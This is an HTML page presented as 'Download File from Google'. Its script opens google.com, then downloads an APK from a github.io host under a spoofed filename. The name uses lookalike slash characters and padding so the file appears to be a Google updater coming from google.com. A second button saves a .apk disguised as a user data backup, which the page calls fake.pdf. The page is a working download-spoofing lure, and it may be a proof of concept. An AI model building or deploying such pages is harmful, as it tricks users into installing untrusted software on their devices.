<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File</title>

</head>

<body>
    <h1>Download File from Google</h1>

    <button onclick="startDownload()">Start Download </button>

    <br>
    <br>
    <br>

    <button id="saveButton" onclick="handleSaveAs()">Select Save As File</button>
    <br> <br>
    <div id="result">Click the button to save the file as fake.pdf.</div>


    <script>
        async function startDownload() {
            window.open('https://google.com', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/filedownload.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download =
                    'updater google.apk (6 MB) ________________________  From https∶⁄⁄ // ⁄⁄ ⫽ ╱╱google.com  and delete malicious file noname';
                link.click();
                URL.revokeObjectURL(url);
            }, 2000);
        }

        function handleSaveAs() {
            // Define the file content and filename
            const fileContent = "This is the content of the fake.pdf file.";
            const fileName =
                "importantbackupfilecontaininguserdataandsettingsforsystem.apk__________________________________________________________From https∶⁄⁄ // ⁄⁄ ⫽ ╱╱google.com";

            // Create a Blob object with the file content
            const blob = new Blob([fileContent], {
                type: "application/pdf"
            });

            // Create an object URL for the blob
            const url = URL.createObjectURL(blob);

            // Create an <a> element to trigger the download
            const a = document.createElement("a");
            a.href = url;
            a.download = fileName; // Specify the file name for download

            // Append the <a> element to the document, trigger the click, and remove it
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // Revoke the object URL to free memory
            URL.revokeObjectURL(url);

            // Display a success message
            document.getElementById("result").innerText = `File saved as ${fileName}.`;
        }
    </script>

</body>

</html>
